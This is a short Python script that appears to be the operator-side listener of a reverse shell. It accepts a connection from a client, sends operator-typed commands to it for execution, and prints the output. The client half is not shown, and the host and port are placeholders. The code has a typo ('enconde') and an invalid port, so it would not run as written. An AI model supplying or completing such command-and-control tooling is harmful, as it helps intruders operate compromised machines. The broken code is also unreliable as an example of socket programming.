import socket

SERVER_HOST = ""
SERVER_PORT = 000

# send 1024 (1kb) a time (as buffer size)
BUFFER_SIZE = 1024
# create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bind the socket to all IP addresses this host
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(10)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT}")
s.settimeout(50)

# accept any connections attemped
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# just sending a message, for demostration purposes
message = "Hello and Welcome".encode()
client_socket.send(message)
while True:
    #get the command from prompt
    command = input("Enter the command you wanna execute:")
    # send the command to the client
    client_socket.send(command.enconde())
    if command.lower() == "exit":
        break
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)
client_socket.close()
s.close()


